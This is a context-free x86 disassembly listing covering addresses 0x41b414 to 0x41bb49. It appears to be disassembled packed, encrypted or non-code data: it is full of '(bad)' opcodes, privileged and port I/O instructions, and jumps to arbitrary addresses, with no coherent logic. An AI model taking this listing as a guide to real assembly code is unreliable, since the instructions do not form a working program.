  41b414:	inc    eax
  41b415:	out    dx,al
  41b416:	add    eax,0x4d539ab5
  41b41b:	pop    DWORD PTR [esi]
  41b41d:	clc    
  41b41e:	jge    0x41b49f
  41b420:	imul   eax,DWORD PTR [ebx],0xf4407b3a
  41b426:	data16 movs BYTE PTR es:[edi],BYTE PTR es:[esi]
  41b429:	pop    ebp
  41b42a:	retf   
  41b42b:	cmp    DWORD PTR [ecx-0x7ef034b4],0xdcdf8a15
  41b435:	sbb    bl,ah
  41b437:	jl     0x41b4b1
  41b439:	clc    
  41b43a:	jbe    0x41b4b2
  41b43c:	xor    eax,0x4d37432c
  41b441:	xchg   ebx,eax
  41b442:	cwde   
  41b443:	int    0x39
  41b445:	rol    BYTE PTR [ecx-0x460dc440],cl
  41b44b:	leave  
  41b44c:	popf   
  41b44d:	test   ah,0x3e
  41b450:	mov    DWORD PTR [edx+0x4d],ebx
  41b453:	cmp    al,0xeb
  41b455:	jae    0x41b435
  41b457:	aam    0xc4
  41b459:	add    DWORD PTR [edi+eiz*4],edx
  41b45c:	es popf 
  41b45e:	cli    
  41b45f:	rcl    BYTE PTR [edx+0x45],0x42
  41b463:	adc    DWORD PTR [esi],esp
  41b465:	mov    BYTE PTR [eax],al
  41b467:	gs mov ecx,0x833ad631
  41b46d:	and    edi,DWORD PTR [ecx-0x5b]
  41b470:	sbb    dh,bh
  41b472:	in     al,dx
  41b473:	add    edx,DWORD PTR [ebx]
  41b475:	or     eax,0x48dfb63f
  41b47a:	lahf   
  41b47b:	xor    edi,DWORD PTR [eax]
  41b47d:	sub    ebp,DWORD PTR [ecx+0x24]
  41b480:	xchg   edx,eax
  41b481:	pop    esp
  41b482:	lods   eax,DWORD PTR ds:[esi]
  41b483:	stc    
  41b484:	jns    0x41b412
  41b486:	nop
  41b487:	push   es
  41b488:	pop    ecx
  41b489:	mov    bl,0x10
  41b48b:	add    esi,DWORD PTR [ebp-0x18]
  41b48e:	jb     0x41b45e
  41b490:	(bad)  
  41b491:	aas    
  41b492:	xchg   DWORD PTR [ecx],ebx
  41b494:	inc    edx
  41b495:	ds mov cl,0xd
  41b498:	dec    esi
  41b499:	pop    edx
  41b49a:	mov    edi,0x8f3f8308
  41b49f:	(bad)  
  41b4a0:	push   DWORD PTR [ebx-0x103feadb]
  41b4a6:	call   0x7861:0x2af91fc9
  41b4ad:	or     al,0xe7
  41b4af:	sub    BYTE PTR [esi],cl
  41b4b1:	inc    esi
  41b4b2:	mov    cl,bl
  41b4b4:	in     eax,0xa4
  41b4b6:	(bad)  
  41b4b7:	jo     0x41b488
  41b4b9:	mov    ebp,0x2a42bc3e
  41b4be:	jmp    0x41b4ef
  41b4c0:	popa   
  41b4c1:	fld    TBYTE PTR [esi-0x30a7757b]
  41b4c7:	add    bl,bl
  41b4c9:	aas    
  41b4ca:	and    eax,0xf3712c35
  41b4cf:	add    eax,0xc39d7af3
  41b4d4:	xlat   BYTE PTR ds:[ebx]
  41b4d5:	repnz out dx,al
  41b4d7:	into   
  41b4d8:	gs xor esi,edi
  41b4db:	add    DWORD PTR [esi],eax
  41b4dd:	add    DWORD PTR [edi],esp
  41b4df:	shr    esp,cl
  41b4e1:	inc    esp
  41b4e2:	loopne 0x41b512
  41b4e4:	int    0x98
  41b4e6:	mov    es,WORD PTR [esi-0x47]
  41b4e9:	xchg   edi,eax
  41b4ea:	addr16 test al,0xf3
  41b4ed:	call   0x459e6db7
  41b4f2:	jmp    0xb927:0x7d4dae33
  41b4f9:	push   0x5180d956
  41b4fe:	(bad)  
  41b4ff:	pop    esp
  41b500:	dec    BYTE PTR [esi-0xf899a99]
  41b506:	iret   
  41b507:	lock je 0x41b4c8
  41b50a:	test   ah,cl
  41b50c:	mov    DWORD PTR [ecx],ebp
  41b50e:	loope  0x41b55a
  41b510:	jmp    FWORD PTR [esi]
  41b512:	sub    edx,edi
  41b514:	mov    ch,0xc6
  41b516:	fnstenv [esi+0x2718f521]
  41b51c:	enter  0xfa23,0xcd
  41b520:	int    0x83
  41b522:	fisttp DWORD PTR [ecx+0x3bb7cfb8]
  41b528:	clc    
  41b529:	sti    
  41b52a:	dec    ecx
  41b52b:	call   DWORD PTR [eax+0x47]
  41b52e:	popf   
  41b52f:	(bad)  
  41b530:	push   0x647fee70
  41b535:	mov    eax,ds:0x8e7de74b
  41b53a:	pusha  
  41b53b:	mov    dl,0xb1
  41b53d:	and    ebp,esp
  41b53f:	jecxz  0x41b564
  41b541:	std    
  41b542:	pop    ebx
  41b543:	(bad)  
  41b544:	inc    esp
  41b545:	stc    
  41b546:	je     0x41b51f
  41b548:	push   cs
  41b549:	mov    edx,0x618ee4e0
  41b54e:	pushf  
  41b54f:	imul   ebx,DWORD PTR [edx+0x3b],0x2eec54e3
  41b556:	sbb    ebp,esi
  41b558:	cli    
  41b559:	fwait
  41b55a:	mov    bh,0xf0
  41b55c:	sbb    eax,DWORD PTR [eax+edx*2]
  41b55f:	or     edx,DWORD PTR [edi]
  41b561:	imul   eax,DWORD PTR [ebx+ecx*4],0xcb7d3178
  41b568:	pop    eax
  41b569:	jne    0x41b5a7
  41b56b:	aad    0x6e
  41b56d:	mov    cl,0x95
  41b56f:	sahf   
  41b570:	loopne 0x41b555
  41b572:	cli    
  41b573:	pop    eax
  41b574:	mov    eax,0x40819c93
  41b579:	jle    0x41b533
  41b57b:	shl    BYTE PTR [eax],0x7e
  41b57e:	fwait
  41b57f:	int    0x36
  41b581:	push   es
  41b582:	sbb    al,al
  41b584:	pop    ss
  41b585:	(bad)  
  41b586:	or     eax,DWORD PTR [eax]
  41b588:	jae    0x41b52e
  41b58a:	sub    esi,DWORD PTR [esi+edi*1+0x63]
  41b58e:	adc    eax,0xc19c675e
  41b593:	fild   DWORD PTR [ecx+ebx*1+0x5aaa95e5]
  41b59a:	in     eax,dx
  41b59b:	push   ebp
  41b59c:	jl     0x41b5ac
  41b59e:	sub    al,0x54
  41b5a0:	add    eax,0x9e75a4fd
  41b5a5:	jle    0x41b55c
  41b5a7:	mov    fs,WORD PTR [ebx+0x2c]
  41b5aa:	push   ds
  41b5ab:	jp     0x41b5ab
  41b5ad:	cmp    BYTE PTR [esi+0x68fc6c46],dh
  41b5b3:	cmp    al,0xd5
  41b5b5:	push   edx
  41b5b6:	dec    esp
  41b5b7:	mov    ah,0x3e
  41b5b9:	or     ecx,ecx
  41b5bb:	xchg   esi,eax
  41b5bc:	xchg   ebx,eax
  41b5bd:	cld    
  41b5be:	enter  0x5552,0x8e
  41b5c2:	les    esp,FWORD PTR [eax+eiz*4]
  41b5c5:	not    esp
  41b5c7:	das    
  41b5c8:	add    edx,DWORD PTR [eax-0x63]
  41b5cb:	and    BYTE PTR [esi],bl
  41b5cd:	std    
  41b5ce:	loop   0x41b63b
  41b5d0:	out    0x31,al
  41b5d2:	or     al,BYTE PTR [edi]
  41b5d4:	add    eax,0x8725c392
  41b5d9:	scas   al,BYTE PTR es:[edi]
  41b5da:	stos   DWORD PTR es:[edi],eax
  41b5db:	aad    0x63
  41b5dd:	xchg   edi,eax
  41b5de:	push   esp
  41b5df:	nop
  41b5e0:	gs in  eax,dx
  41b5e2:	aaa    
  41b5e3:	pop    ebx
  41b5e4:	xchg   ebp,eax
  41b5e5:	lds    eax,FWORD PTR [ebx+0x31740fad]
  41b5eb:	inc    eax
  41b5ec:	shl    BYTE PTR [ebx+ebp*1+0x29],cl
  41b5f0:	rol    BYTE PTR ds:0x6e52f077,0xab
  41b5f7:	mov    eax,ds:0x4e74f5f0
  41b5fc:	fld    QWORD PTR [ebx+0x5c]
  41b5ff:	in     eax,0x74
  41b601:	mov    ebp,0x1a2ae5a7
  41b606:	loopne 0x41b670
  41b608:	retf   0xe676
  41b60b:	xor    al,0x79
  41b60d:	or     al,0x6d
  41b60f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b610:	push   ebp
  41b611:	out    dx,al
  41b612:	inc    edi
  41b613:	push   ss
  41b614:	in     eax,dx
  41b615:	jecxz  0x41b651
  41b617:	or     eax,0xedc71e1e
  41b61c:	and    bl,BYTE PTR [esi+0x74]
  41b61f:	sahf   
  41b620:	lahf   
  41b621:	inc    esp
  41b622:	and    ecx,edx
  41b624:	pop    ecx
  41b625:	mov    dl,0xe
  41b627:	enter  0x86bf,0x83
  41b62b:	inc    esi
  41b62c:	enter  0x6206,0x35
  41b630:	outs   dx,BYTE PTR ds:[esi]
  41b631:	out    0x76,al
  41b633:	mov    al,0x8e
  41b635:	paddd  mm3,QWORD PTR [ebp-0x4f]
  41b639:	fwait
  41b63a:	dec    ebp
  41b63b:	or     DWORD PTR [eax],ebx
  41b63d:	adc    ecx,0x6e0f4195
  41b643:	pop    eax
  41b644:	(bad)  
  41b645:	out    dx,al
  41b646:	jno    0x41b5d3
  41b648:	and    BYTE PTR [eax+0x47113881],al
  41b64e:	jnp    0x41b6ac
  41b650:	xchg   edi,eax
  41b651:	scas   al,BYTE PTR es:[edi]
  41b652:	or     DWORD PTR [eax+eax*8],0x4c8b1ea
  41b659:	sbb    al,0xef
  41b65b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b65c:	pop    esi
  41b65d:	mov    al,ds:0xebb6068a
  41b662:	lods   al,BYTE PTR ds:[esi]
  41b663:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41b665:	xor    DWORD PTR [eax+0x6bafb68e],esp
  41b66b:	pop    es
  41b66c:	cld    
  41b66d:	scas   al,BYTE PTR es:[edi]
  41b66e:	shr    edi,1
  41b670:	mov    bl,0xb7
  41b672:	(bad)  
  41b673:	arpl   WORD PTR [ebx+0x24cd4003],dx
  41b679:	jle    0x41b650
  41b67b:	xor    DWORD PTR [edx],0x4d
  41b67e:	push   ecx
  41b67f:	cs pop esp
  41b681:	loop   0x41b61f
  41b683:	lea    edi,[eax-0x5e]
  41b686:	ret    
  41b687:	dec    ecx
  41b688:	pop    ebp
  41b689:	arpl   WORD PTR [esi+esi*2+0x47dadea0],si
  41b690:	xor    edx,DWORD PTR [eax+eiz*4-0x39]
  41b694:	jnp    0x41b632
  41b696:	push   edi
  41b697:	test   eax,0x356afa91
  41b69c:	dec    esi
  41b69d:	mov    BYTE PTR [edx-0x214619e8],dl
  41b6a3:	add    di,WORD PTR [edi+0x1b4b28d3]
  41b6aa:	cmp    eax,0x3b13748a
  41b6af:	bound  eax,QWORD PTR [edi-0x7b6755a9]
  41b6b5:	jp     0x41b686
  41b6b7:	iret   
  41b6b8:	lea    esi,ds:0x306e8de8
  41b6be:	outs   dx,BYTE PTR ds:[esi]
  41b6bf:	pushf  
  41b6c0:	mov    dl,BYTE PTR [edx+0x4d]
  41b6c3:	push   ebx
  41b6c4:	mov    cl,0x8a
  41b6c6:	sub    BYTE PTR [ebx-0x6a],al
  41b6c9:	mov    ds:0x44f24545,eax
  41b6ce:	mov    edi,cs
  41b6d0:	push   esp
  41b6d1:	loope  0x41b731
  41b6d3:	cmpps  xmm1,XMMWORD PTR [edi-0x225b69bc],0x1f
  41b6db:	das    
  41b6dc:	inc    eax
  41b6dd:	mov    esp,0x209f598
  41b6e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6e3:	mov    bl,0xc1
  41b6e5:	mov    al,ds:0xb181be0f
  41b6ea:	in     eax,0x2c
  41b6ec:	fnstsw WORD PTR [eax]
  41b6ee:	std    
  41b6ef:	push   esp
  41b6f0:	pop    esp
  41b6f1:	ss push edi
  41b6f3:	adc    ebp,ecx
  41b6f5:	mov    ah,0x35
  41b6f7:	adc    dl,bl
  41b6f9:	cmp    esp,DWORD PTR [edi-0x37]
  41b6fc:	in     eax,0x46
  41b6fe:	call   0x857c30ab
  41b703:	add    DWORD PTR [edi],0xffffffa6
  41b706:	xchg   esp,eax
  41b707:	scas   eax,DWORD PTR es:[edi]
  41b708:	jbe    0x41b6da
  41b70a:	jg     0x41b73b
  41b70c:	sbb    BYTE PTR [eax+edx*1-0x14],dh
  41b710:	or     al,0xa6
  41b712:	(bad)  
  41b713:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b715:	xchg   edx,eax
  41b716:	test   al,0xa5
  41b718:	and    al,0x2c
  41b71a:	adc    ch,BYTE PTR [edx+0x1a]
  41b71d:	leave  
  41b71e:	mov    BYTE PTR [esi],ah
  41b720:	inc    ecx
  41b721:	dec    eax
  41b722:	add    DWORD PTR [ecx],edx
  41b724:	fadd   QWORD PTR [eax+eiz*1]
  41b727:	(bad)  
  41b728:	mov    al,ds:0xb8a08e3e
  41b72d:	push   ebx
  41b72e:	mov    bl,0xd1
  41b730:	jne    0x41b6d1
  41b732:	push   ebp
  41b733:	std    
  41b734:	pop    esi
  41b735:	in     eax,dx
  41b736:	rdmsr  
  41b738:	jnp    0x41b7b0
  41b73a:	push   ds
  41b73b:	xlat   BYTE PTR ds:[ebx]
  41b73c:	cli    
  41b73d:	jne    0x41b786
  41b73f:	jb     0x41b78e
  41b741:	pop    eax
  41b742:	dec    ebx
  41b743:	stos   BYTE PTR es:[edi],al
  41b744:	(bad)  
  41b745:	scas   al,BYTE PTR es:[edi]
  41b746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b747:	jecxz  0x41b7ab
  41b749:	or     al,BYTE PTR [esi+0x21]
  41b74c:	or     eax,0x6f4d16f0
  41b751:	sub    al,0xbe
  41b753:	and    DWORD PTR [esi-0x3c122a86],ecx
  41b759:	cmp    dh,BYTE PTR [ecx+0x5c]
  41b75c:	sbb    ebp,0xa20f1f52
  41b762:	or     cl,BYTE PTR [edx+0x69]
  41b765:	pusha  
  41b766:	outs   dx,BYTE PTR ds:[esi]
  41b767:	adc    eax,0xb8da1f97
  41b76c:	sbb    BYTE PTR ds:0x1848a6f,0xca
  41b773:	pop    edi
  41b774:	jg     0x41b72e
  41b776:	adc    dh,cl
  41b778:	and    BYTE PTR [ebp-0x77],ch
  41b77b:	xchg   esp,eax
  41b77c:	xor    al,0xe
  41b77e:	or     DWORD PTR [esi-0x2e],ecx
  41b781:	push   ds
  41b782:	setbe  BYTE PTR [edi+ecx*8-0x3171b295]
  41b78a:	(bad)  
  41b78b:	call   0x3c57:0x4221d1e2
  41b792:	add    BYTE PTR [esi+0x1bd2ee18],0x73
  41b799:	dec    esi
  41b79a:	mul    DWORD PTR [esi+ebx*1]
  41b79d:	adc    BYTE PTR [ecx+eax*1-0xe3e2c0a],dl
  41b7a4:	jnp    0x41b824
  41b7a6:	(bad)  
  41b7a8:	bound  ebp,QWORD PTR [eax]
  41b7aa:	jg     0x41b797
  41b7ac:	xor    ah,BYTE PTR [eax-0x4fbfe6ab]
  41b7b2:	idiv   BYTE PTR [ecx-0x41]
  41b7b5:	jg     0x41b80f
  41b7b7:	iret   
  41b7b8:	(bad)  
  41b7b9:	(bad)  
  41b7ba:	xchg   ecx,eax
  41b7bb:	xlat   BYTE PTR ds:[ebx]
  41b7bc:	jmp    FWORD PTR [esi+0x46]
  41b7bf:	jmp    0x41b832
  41b7c1:	cmp    eax,0xbae69224
  41b7c6:	movnti DWORD PTR [ebp-0x6e3adc78],edx
  41b7cd:	pop    ecx
  41b7ce:	and    DWORD PTR [eax],ecx
  41b7d0:	repnz xchg edx,eax
  41b7d2:	adc    DWORD PTR [edi],edx
  41b7d4:	(bad)  [edx-0x19]
  41b7d7:	mov    ebp,ds
  41b7d9:	in     eax,0xc6
  41b7db:	jg     0x41b76b
  41b7dd:	std    
  41b7de:	jmp    0x9755d8dd
  41b7e3:	xchg   ebx,eax
  41b7e4:	jmp    0x41b805
  41b7e6:	inc    BYTE PTR [edx]
  41b7e8:	fwait
  41b7e9:	and    DWORD PTR [edi+0x1c486401],esi
  41b7ef:	or     cl,BYTE PTR [ecx]
  41b7f1:	ins    DWORD PTR es:[edi],dx
  41b7f2:	(bad)  
  41b7f3:	xor    BYTE PTR [esi+0x4615432c],cl
  41b7f9:	and    al,0xe
  41b7fb:	cmp    eax,esp
  41b7fd:	lock popa 
  41b7ff:	add    eax,0x28147e64
  41b804:	scas   al,BYTE PTR es:[edi]
  41b805:	test   al,dh
  41b807:	xchg   edi,eax
  41b808:	das    
  41b809:	push   eax
  41b80a:	pop    ebp
  41b80b:	inc    edx
  41b80c:	mov    cl,0xc4
  41b80e:	jae    0x41b800
  41b810:	add    DWORD PTR [ecx-0x3d],0xffffff8a
  41b814:	sbb    DWORD PTR [ebp+0x11f33da8],0x31
  41b81b:	pop    esi
  41b81c:	xchg   edi,eax
  41b81d:	rcl    BYTE PTR [ebp+esi*4-0x74],cl
  41b821:	mov    DWORD PTR [ebx-0x51],ebx
  41b824:	test   al,0x81
  41b826:	jne    0x41b81a
  41b828:	jbe    0x41b7b3
  41b82a:	push   ds
  41b82b:	xchg   edx,eax
  41b82c:	popf   
  41b82d:	xchg   DWORD PTR [edi+0x66a690dd],edi
  41b833:	cdq    
  41b834:	out    dx,al
  41b835:	adc    ebx,DWORD PTR [eax+0x21]
  41b838:	mov    edi,0x124a9ada
  41b83d:	imul   edi,DWORD PTR [ebp+0x7e],0xc43dd03b
  41b844:	pop    ds
  41b845:	push   0x59
  41b847:	daa    
  41b848:	rol    BYTE PTR [esp+edi*4],cl
  41b84b:	sbb    DWORD PTR [ebp+0x6a6ed15c],ebp
  41b851:	or     ah,BYTE PTR [ecx]
  41b853:	les    esi,FWORD PTR [edi]
  41b855:	xor    eax,0xabc41b70
  41b85a:	out    0x2e,al
  41b85c:	sahf   
  41b85d:	fnsave ds:0x39c1a21e
  41b863:	iret   
  41b864:	jnp    0x41b896
  41b866:	mov    ds:0xb5e39aaf,al
  41b86b:	fld    DWORD PTR [eax]
  41b86d:	dec    ecx
  41b86e:	cmp    eax,eax
  41b870:	xchg   esp,eax
  41b871:	jmp    0x73f08852
  41b876:	cmp    al,0xdf
  41b878:	add    cl,BYTE PTR [edi-0x62]
  41b87b:	jnp    0x41b8c8
  41b87d:	scas   eax,DWORD PTR es:[edi]
  41b87e:	push   ss
  41b87f:	idiv   DWORD PTR [edi+0x51]
  41b882:	mov    edx,0xb92cf713
  41b887:	mov    ebx,0x9dda8222
  41b88c:	mov    al,0xa4
  41b88e:	(bad)  
  41b88f:	jg     0x41b89d
  41b891:	lock repnz pop esp
  41b894:	lods   eax,DWORD PTR ds:[esi]
  41b895:	dec    edx
  41b896:	cmp    DWORD PTR [edi-0x31176f6b],edx
  41b89c:	retf   0x4d68
  41b89f:	push   esi
  41b8a0:	adc    DWORD PTR [edx-0x1e2d37b9],ebp
  41b8a6:	cwde   
  41b8a7:	les    esp,FWORD PTR [ebx]
  41b8a9:	pop    eax
  41b8aa:	ret    
  41b8ab:	jge    0x41b880
  41b8ad:	and    DWORD PTR [edx-0x60],esi
  41b8b0:	mov    ebp,0x9f035419
  41b8b5:	jnp    0x41b8e7
  41b8b7:	mov    ah,0x15
  41b8b9:	aaa    
  41b8ba:	pop    ecx
  41b8bb:	repnz mov ds:0x75234292,al
  41b8c1:	xor    ebp,esi
  41b8c3:	cld    
  41b8c4:	pop    es
  41b8c5:	xor    dh,BYTE PTR [ebp-0x6dd43bd5]
  41b8cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8cc:	adc    eax,0xc66fc48c
  41b8d1:	ret    
  41b8d2:	pop    es
  41b8d3:	cmc    
  41b8d4:	out    0xa6,al
  41b8d6:	sbb    bl,BYTE PTR [edi]
  41b8d8:	fst    DWORD PTR [eax-0x4bf47fe5]
  41b8de:	dec    edx
  41b8df:	push   ebp
  41b8e0:	mov    al,0xe1
  41b8e2:	outs   dx,DWORD PTR ds:[esi]
  41b8e3:	pusha  
  41b8e4:	stos   DWORD PTR es:[edi],eax
  41b8e5:	cli    
  41b8e6:	and    cl,BYTE PTR [eax]
  41b8e8:	jle    0x41b892
  41b8ea:	cwde   
  41b8eb:	pop    edx
  41b8ec:	or     bx,WORD PTR [edx*1+0x3d00877f]
  41b8f4:	jmp    0x9d78fcec
  41b8f9:	data16 icebp 
  41b8fb:	inc    ecx
  41b8fc:	ror    BYTE PTR [edx],0x29
  41b8ff:	inc    ebx
  41b900:	inc    ebx
  41b901:	xor    edx,ebx
  41b903:	in     al,dx
  41b904:	mov    edx,0xbcf78eb0
  41b909:	sbb    BYTE PTR [ebp+ebx*1-0x4d80a67e],0x49
  41b911:	dec    esp
  41b912:	pop    edi
  41b913:	dec    DWORD PTR [ebx]
  41b915:	adc    ebp,eax
  41b917:	call   0x4e057db0
  41b91c:	xor    al,0xe9
  41b91e:	cmp    esi,esp
  41b920:	jae    0x41b960
  41b922:	(bad)  
  41b923:	ror    DWORD PTR [ecx],cl
  41b925:	test   BYTE PTR [edx+0x28c19ac9],dl
  41b92b:	xor    ebp,0x1d567f47
  41b931:	ins    BYTE PTR es:[edi],dx
  41b932:	addr16 pop ebx
  41b934:	jge    0x41b934
  41b936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b937:	pushf  
  41b938:	jg     0x41b976
  41b93a:	push   ebp
  41b93b:	or     al,0x68
  41b93d:	add    al,al
  41b93f:	int    0x35
  41b941:	stos   BYTE PTR es:[edi],al
  41b942:	and    dl,dh
  41b944:	mov    ebp,0x1924598f
  41b949:	in     eax,0xed
  41b94b:	test   esi,eax
  41b94d:	xor    al,0x7e
  41b94f:	xchg   DWORD PTR [edx],esi
  41b951:	stos   DWORD PTR es:[edi],eax
  41b952:	sub    dh,dl
  41b954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b955:	or     al,BYTE PTR [ebp+0x7]
  41b958:	sub    al,0xe5
  41b95a:	lods   al,BYTE PTR ds:[esi]
  41b95b:	mov    esp,DWORD PTR [ecx+0xb93a4e1]
  41b961:	shl    BYTE PTR [edi],0x71
  41b964:	add    al,0x2e
  41b966:	sbb    BYTE PTR [ebp-0x6f67d66d],dh
  41b96c:	xor    al,0xa0
  41b96e:	jl     0x41b9b2
  41b970:	mov    edx,DWORD PTR [eax+0x76]
  41b973:	ret    
  41b974:	ror    BYTE PTR [esi+0x8],1
  41b977:	dec    esi
  41b978:	push   esi
  41b979:	mov    ss,edi
  41b97b:	rcr    BYTE PTR [ecx-0x299a65b4],0x14
  41b982:	cmp    edx,edi
  41b984:	inc    edi
  41b985:	iret   
  41b986:	adc    ebx,edi
  41b988:	loope  0x41b9a1
  41b98a:	addr16 je 0x41b912
  41b98d:	cmp    BYTE PTR [edi-0x2b],dl
  41b990:	dec    ecx
  41b991:	xor    al,0x96
  41b993:	xchg   edi,eax
  41b994:	cdq    
  41b995:	mov    ds:0x372e5fe,al
  41b99a:	push   edi
  41b99b:	inc    ebp
  41b99c:	fldcw  WORD PTR [ebp-0x60b25058]
  41b9a2:	adc    cl,bh
  41b9a4:	xchg   esp,eax
  41b9a5:	lea    esi,[esi+0x6f]
  41b9a8:	sbb    al,0xdc
  41b9aa:	or     eax,DWORD PTR [edi-0x3bb9f88]
  41b9b0:	mov    cs,WORD PTR [ebx]
  41b9b2:	pop    ecx
  41b9b3:	fs icebp 
  41b9b5:	pop    esp
  41b9b6:	push   gs
  41b9b8:	mov    ch,0xca
  41b9ba:	in     al,0xa3
  41b9bc:	or     ch,BYTE PTR [ecx]
  41b9be:	lods   eax,DWORD PTR ds:[esi]
  41b9bf:	into   
  41b9c0:	bound  ecx,QWORD PTR [ebp-0xa76f62d]
  41b9c6:	push   esp
  41b9c7:	xchg   esi,eax
  41b9c8:	or     eax,DWORD PTR [ebp-0x63a4443a]
  41b9ce:	das    
  41b9cf:	dec    ebx
  41b9d0:	rcl    esp,cl
  41b9d2:	stc    
  41b9d3:	add    BYTE PTR [edx],0xfb
  41b9d6:	jp     0x41b9bc
  41b9d8:	dec    esp
  41b9d9:	or     BYTE PTR [ecx*1-0x62902280],bh
  41b9e0:	or     eax,DWORD PTR ds:0x5668f280
  41b9e6:	jb     0x41ba0a
  41b9e8:	fst    DWORD PTR [eax-0x6aac0ea0]
  41b9ee:	push   eax
  41b9ef:	fcomp  QWORD PTR [esi+0x1e9156a9]
  41b9f5:	jp     0x41ba74
  41b9f7:	test   al,0xdd
  41b9f9:	shl    BYTE PTR [ebx],cl
  41b9fb:	push   cs
  41b9fc:	dec    edx
  41b9fd:	in     eax,dx
  41b9fe:	cmc    
  41b9ff:	dec    eax
  41ba00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba01:	and    ch,BYTE PTR [edi-0x5a61234e]
  41ba07:	mov    es,WORD PTR [ecx]
  41ba09:	mov    ds:0xe33a1498,eax
  41ba0e:	iret   
  41ba0f:	(bad)
  41ba12:	ins    BYTE PTR es:[edi],dx
  41ba13:	ins    BYTE PTR es:[edi],dx
  41ba14:	push   ds
  41ba15:	aam    0x7
  41ba17:	inc    edx
  41ba18:	bound  esi,QWORD PTR [edx]
  41ba1a:	enter  0x7922,0xc7
  41ba1e:	push   ds
  41ba1f:	and    eax,0xbfb9130a
  41ba24:	mov    ds:0xeb38cee8,eax
  41ba29:	and    ebp,ecx
  41ba2b:	les    edx,FWORD PTR [esi]
  41ba2d:	lock cmc 
  41ba2f:	cmp    al,0x3d
  41ba31:	inc    esi
  41ba32:	and    al,0xc0
  41ba34:	xchg   esp,eax
  41ba35:	sub    al,0xa2
  41ba37:	imul   ebp,DWORD PTR [ebp+eiz*2+0x33],0xf201448d
  41ba3f:	mov    edx,0xe59bfc27
  41ba44:	aam    0x48
  41ba46:	bound  esp,QWORD PTR [edi]
  41ba48:	dec    esi
  41ba49:	pushf  
  41ba4a:	mov    al,ds:0x6cde7499
  41ba4f:	cld    
  41ba50:	mov    dl,0xee
  41ba52:	lea    ebx,[ebx-0x6a]
  41ba55:	clc    
  41ba56:	push   ds
  41ba57:	and    esi,DWORD PTR [edi-0x5c]
  41ba5a:	dec    esp
  41ba5b:	cmc    
  41ba5c:	imul   esi,DWORD PTR [esi+0x149b6f3a],0xffffffbb
  41ba63:	sbb    dh,al
  41ba65:	sbb    bl,BYTE PTR [ebx-0x7c157572]
  41ba6b:	sub    BYTE PTR [edx-0x6f],cl
  41ba6e:	(bad)  [ebp+0x16b5bf0f]
  41ba74:	call   0x48f57720
  41ba79:	pop    esp
  41ba7a:	lahf   
  41ba7b:	mov    esp,0x4306e56b
  41ba80:	punpckhwd mm5,QWORD PTR [ebx]
  41ba83:	test   al,0x75
  41ba85:	or     cl,BYTE PTR [edx]
  41ba87:	xor    eax,0x876d4fad
  41ba8c:	stos   DWORD PTR es:[edi],eax
  41ba8d:	and    dh,BYTE PTR [eax+0x1bdd9b62]
  41ba93:	ins    DWORD PTR es:[edi],dx
  41ba94:	fidivr WORD PTR [edi+eax*4+0x58]
  41ba98:	rcl    bl,0x14
  41ba9b:	jg     0x41bad7
  41ba9d:	xchg   ecx,edx
  41ba9f:	mov    dh,0x5b
  41baa1:	mov    cl,0xf6
  41baa3:	jmp    FWORD PTR [ebx]
  41baa5:	cwde   
  41baa6:	inc    ebp
  41baa7:	jae    0x41baaa
  41baa9:	ret    
  41baaa:	adc    eax,0xd8804fc
  41baaf:	pop    edx
  41bab0:	icebp  
  41bab1:	pushf  
  41bab2:	mul    DWORD PTR [ebx+eax*2-0x7a]
  41bab6:	mov    eax,tr1
  41bab9:	fnstcw WORD PTR [edx+0x7dce2878]
  41babf:	pop    ss
  41bac0:	stos   BYTE PTR es:[edi],al
  41bac1:	jns    0x41ba63
  41bac3:	push   esp
  41bac4:	sahf   
  41bac5:	rcl    BYTE PTR [ebx-0x37566453],0x39
  41bacc:	loop   0x41ba97
  41bace:	ins    BYTE PTR es:[edi],dx
  41bacf:	nop
  41bad0:	in     eax,0x1e
  41bad2:	mov    gs,esi
  41bad4:	sbb    eax,ecx
  41bad6:	mov    esi,0x25f59150
  41badb:	push   edx
  41badc:	fisubr WORD PTR fs:[edx-0x7025f8bd]
  41bae3:	rcr    DWORD PTR [edx],1
  41bae5:	inc    eax
  41bae6:	push   esp
  41bae7:	mov    ebx,0x79ba7a23
  41baec:	scas   al,BYTE PTR es:[edi]
  41baed:	or     DWORD PTR [ebx-0x8],edi
  41baf0:	ret    
  41baf1:	push   eax
  41baf2:	push   eax
  41baf3:	sbb    BYTE PTR [eax-0x29dcc3d9],ah
  41baf9:	sbb    DWORD PTR [eax],0xaed53c09
  41baff:	xchg   ecx,eax
  41bb00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb01:	in     al,0x1a
  41bb03:	mov    eax,ds:0x2c83d8b4
  41bb08:	fldcw  WORD PTR [ebx]
  41bb0a:	arpl   WORD PTR [esi+ebx*1],ax
  41bb0d:	cwde   
  41bb0e:	xchg   BYTE PTR [eax+esi*2],bh
  41bb11:	(bad)  
  41bb12:	into   
  41bb13:	scas   eax,DWORD PTR es:[edi]
  41bb14:	xchg   edi,eax
  41bb15:	pusha  
  41bb16:	xchg   BYTE PTR [edx],ah
  41bb18:	lods   eax,DWORD PTR ds:[esi]
  41bb19:	test   al,0xc
  41bb1b:	ss cmc 
  41bb1d:	and    eax,0x3d8dfa22
  41bb22:	outs   dx,DWORD PTR ds:[esi]
  41bb23:	sub    BYTE PTR [edi],bh
  41bb25:	fisubr DWORD PTR [ecx-0x52]
  41bb28:	cs mov esp,0xc3fa0565
  41bb2e:	push   ebx
  41bb2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb30:	cmp    ebx,DWORD PTR [esi-0x4e9108a2]
  41bb36:	push   cs
  41bb37:	mov    cl,0xbe
  41bb39:	repnz sbb DWORD PTR [ebp-0x47],edx
  41bb3d:	and    eax,0x13549259
  41bb42:	popa   
  41bb43:	lea    ebp,[ebx+0x68]
  41bb46:	xor    DWORD PTR [edi],0x5d
  41bb49:	mov    ebx,0x701706c1
